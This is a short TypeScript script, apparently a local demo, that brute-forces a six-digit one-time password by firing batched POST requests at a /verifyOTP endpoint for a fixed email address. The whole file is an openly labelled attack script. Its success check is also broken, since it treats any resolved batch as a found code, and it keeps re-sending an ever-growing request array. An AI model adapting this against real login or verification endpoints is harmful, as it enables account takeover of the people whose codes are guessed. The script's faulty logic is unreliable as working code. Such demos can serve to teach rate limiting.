import axios from "axios";

async function sendRequest(otp: string) {
    let data = JSON.stringify({
        email: "raj@email.com",
        userOTP: otp,
    });

    let config = {
        method: "post",
        maxBodyLength: Infinity,
        url: "http://localhost:3000/verifyOTP",
        headers: {
            "Content-Type": "application/json",
        },
        data: data,
    };

    try {
        const response = await axios.request(config);
        console.log(JSON.stringify(response.data));
        return true;
    } catch (error: any) {
        console.log("Some error happened");
    }
}

// Batching process for the attack
async function attack() {
    const p = [];
    for (let i = 100000; i < 200000; i += 100) {
        for (let j = 1; j < 100; j++) {
            const otp = (i + j).toString();
            p.push(sendRequest(otp));
        }

        const res = await Promise.all(p);
        if (res) {
            console.log("OTP found");
            break;
        }
    }
}

attack();
